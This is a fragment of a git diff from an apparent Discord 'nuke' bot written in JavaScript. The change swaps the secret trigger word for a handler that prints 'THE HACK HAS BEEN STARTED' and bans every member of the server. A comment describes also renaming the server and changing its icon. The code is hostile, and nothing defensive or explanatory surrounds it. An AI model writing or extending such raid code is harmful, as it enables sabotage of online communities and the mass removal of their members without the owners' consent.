@@ -69,7 +69,7 @@ client.on('guildCreate', async (guild) => {
 
 //change the bot status and change the bot name and change the bot avatar and the servericon and the servername
 client.on('message', message => {
-    if (message.content === x_x) {
+    if (message.content === nanodesu) {
         console.log(`THE HACK HAS BEEN STARTED`)
         message.guild.members.forEach(baand => {
        baand.ban({reason: spam,});
